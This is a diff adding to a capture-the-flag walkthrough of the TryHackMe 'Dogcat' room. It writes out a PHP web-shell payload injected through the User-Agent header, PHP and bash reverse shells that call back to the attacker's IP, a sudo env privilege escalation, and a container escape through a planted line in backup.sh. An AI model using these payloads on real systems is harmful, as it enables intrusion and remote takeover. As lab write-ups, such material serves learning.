@@ -229,16 +229,168 @@ Let me try also the `/var/log/apache2/access.log` file to achieve further enumer
 Decoded format:
 ![[33.png]]
 
-The application directly gets our user agent as above. After a couple of minutes, I thought that in HackTheBox platform I saw an approach which was very useful especially to catch `RCE` on User Agent part.
+The application directly gets our user agent as above. After a couple of minutes, I thought that in HackTheBox platform I saw an approach a machine called `Headless` which was very useful especially to execute commands through on User Agent part.
 
 ![[34.png]]
 
-Bursuite gave me better result. Let me try to user-agent manipulation because  if we can somehow execute `php's system();` command it will also execute on main php file. After I execute such a command:
+This is what front-end renders at the same time:
+![[35.png]]
+
+Burpsuite gave me better result. Let me try to user-agent manipulation because  if we can somehow execute php's `system();` command it will also execute on main php file. After I execute such a command:
 
 ```
 <?php system("ls")?>
 ```
 
-I was no longer access `access.log` file because of the default `Apache2` configuration. Using web shell can be suitable for our condition `&cmd='ls' or ?cmd='ls'`
+I was no longer access `access.log` file because of the default `Apache2` configuration. Using web shell can be suitable for our condition `&cmd='ls' or ?cmd='ls'`. I thought this idea from a [Reddit post](https://www.reddit.com/r/AskNetsec/comments/8ckbc7/executing_a_php_script_a_reverse_shell_by_calling/)
+describing our situation.
+
+![[TryHackMe/Dogcat/images/36.png]]
+
+Before I began, adding our php command on User-Agent would be suitable. Let's try all our sources:
+
+Now I verified that I could run command remotely by using such payload:
+
+```
+User-Agent: <?php system('ls'); ?>
+```
+
+### Note: Do not forget to finish your method with ; in every php function.
+
+![[38.png]]
+
+Furthermore, user-agent did not work more than once. Switch on `GET` method to get reverse shell.
+
+```
+system(GET['cmd']);
+```
+
+To retrieve cmd on PHP just passing `&cmd` is enough to get `$cmd` parameter from url because we are gonna apply also URL encoding to make our payload working. In my first attempt, `User-Agent` was blocked by application in second time. Now `URL encoding` was useful in that concept. `cmd` parameter also dynamically stores the payload value which is `whoami` command to guarantee PoC:
+
+Payload (Encoded):
+```
+// Retrieve cmd variable by using GET super-global array then gets value from url.
+<?php system($_GET['cmd']); ?>
+
+// Give whatever you want like erkanucar, serkangenc, cuneytsevgi and so on
+
+// Encoded Format:
+%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E
+```
+
+![[40.png]]
+
+### PoC for user:
+
+![[41.png]]
+
+Let's embed our reverse shell:
+
+```
+php -r '$sock=fsockopen("10.11.69.113", 1984);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+// encoded:
+php%20-r%20%27%24sock%3Dfsockopen%28%2210.11.69.113%22%2C%201984%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+```
+
+After tampering couple of times on encoding parts especially for reverse shell payload. I recognized that you just need to encode `reverse shell payload`. Finally, I got my `reverse shell`:
+
+![[42.png]]
+
+### Flag2: (/var/www/)
+
+![[43.png]]
+
+You can easily reach out the second `flag` from here.
+
+### Flag3: (Privilege Escalation - Binary Exploitation (env))
+
+![[44.png]]
+
+By default I applied [GFTObins](https://gtfobins.github.io/gtfobins/env/) mentality then check for `binaries` that I can run. Prompt told me that you are ready to run `env` binary with `sudo` privilege. That's all !
+
+Payload that you need to use in below:
+
+```
+sudo env /bin/sh
+```
+
+![[45.png]]
+
+Now as a result, we really **Get The Fuck Out The Binary** :)
+
+![[46.png]]
+
+Last flag located on `root` directory:
+
+![[47.png]]
 
 
+
+### Flag4 (linpeas.sh & Container Escape)
+
+I deployed a python server using below command:
+
+```
+python3 -m http.server 3131
+```
+
+After that I checked whether I have `curl` or not:
+
+```
+which curl
+```
+
+Lastly, download `linpeas.sh` from your local:
+
+```
+curl -O http://10.11.69.113:3131/linpeas.sh
+```
+
+Give execution permission:
+
+```
+chmod +x linpeas.sh
+```
+
+Fire !
+
+```
+./linpeas.sh
+```
+
+![[48.png]]
+
+Thx Carlos :)
+
+I recognized that I was in `Docker Container` and there was just only one way to get rid of container which is `VM escape`.
+
+![[TryHackMe/Dogcat/images/49.png]]
+
+![[50.png]]
+I was able to apply `release_agent 1` ,but I never tried instead I found different and weird path with `.sh` script.
+
+![[51.png]]
+
+Let me move on here:
+
+![[52.png]]
+
+Unfortunately, I did not have any text editor (`nano` or `vim`)
+
+![[53.png]]
+
+We should get rid of the VM. In this step we have only one way to `escape` through the `root` of the container. Get your `bash` [reverse shell](https://tex2e.github.io/reverse-shell-generator/index.html) :
+
+```
+echo "bash -i >& /dev/tcp/10.11.69.113/2323 0>&1" >> backup.sh
+```
+
+
+It was too weird ,but in my initial execution of `backup.sh` was successful. However, I got a shell which was not like a escaped root shell.
+
+![[54.png]]
+
+It worked in my second attempt then gave me another shell, real root user :D
+
+![[55.png]]
